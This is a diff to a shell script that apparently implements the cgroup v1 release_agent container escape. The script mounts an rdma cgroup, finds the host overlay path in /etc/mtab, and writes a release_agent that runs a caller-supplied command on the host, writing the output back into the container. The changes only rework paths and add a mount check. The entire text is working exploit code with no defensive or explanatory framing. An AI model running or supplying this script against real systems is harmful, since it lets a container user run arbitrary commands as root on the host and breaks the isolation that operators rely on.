@@ -1,17 +1,25 @@
 #!/bin/sh
 random_folder=$(date +%s | md5sum | cut -c1-10)
-temp_dir="/tmp/$random_folder"
+temp_dir="/tmp/cgrp/$random_folder"
+cgrp_path="/tmp/cgrp"
 
-mkdir -p "$temp_dir"
-mkdir "$temp_dir/cgrp" && mount -t cgroup -o rdma cgroup "$temp_dir/cgrp" && mkdir "$temp_dir/cgrp/x"
+mkdir -p "$cgrp_path"
 
-echo 1 > "$temp_dir/cgrp/x/notify_on_release"
+if ! mountpoint -q "$cgrp_path"; then
+    mount -t cgroup -o rdma cgroup "$cgrp_path"
+else
+    echo "Warning: cgroup already mounted at $cgrp_path"
+fi
+
+mkdir "$temp_dir"
+
+echo 1 > "$temp_dir/notify_on_release"
 host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
-echo "$host_path/cmd" > "$temp_dir/cgrp/release_agent"
+echo "$host_path/cmd" > "/tmp/cgrp/release_agent"
 
 echo '#!/bin/sh' > /cmd
 echo "$1 > $host_path/output" >> /cmd
 chmod a+x /cmd
 
-sh -c "echo \$\$ > $temp_dir/cgrp/x/cgroup.procs"
+sh -c "echo \$\$ > $temp_dir/cgroup.procs"
 head /output
